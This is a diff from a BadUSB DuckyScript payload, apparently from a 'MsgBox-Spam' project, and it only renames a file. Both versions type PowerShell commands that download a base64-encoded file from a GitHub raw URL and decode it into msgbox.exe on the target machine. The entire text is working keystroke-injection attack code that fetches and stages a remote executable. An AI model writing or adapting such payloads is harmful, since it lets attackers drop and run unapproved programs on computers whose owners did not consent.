@@ -7,12 +7,12 @@ DELAY 1000
 
 
 REM Download encoded executable
-STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/encoded-20240309150719.txt'; $out='encoded-20240309150719.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/encoded-msgbox.txt'; $out='encoded-msgbox.txt'; Invoke-WebRequest -Uri $url -OutFile $out
 ENTER
 DELAY 1000
 
 REM Decode the file and save as .exe
-STRING $data=Get-Content -Path encoded-20240309150719.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('msgbox.exe', $decoded)
+STRING $data=Get-Content -Path encoded-msgbox.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('msgbox.exe', $decoded)
 ENTER
 DELAY 1000
 
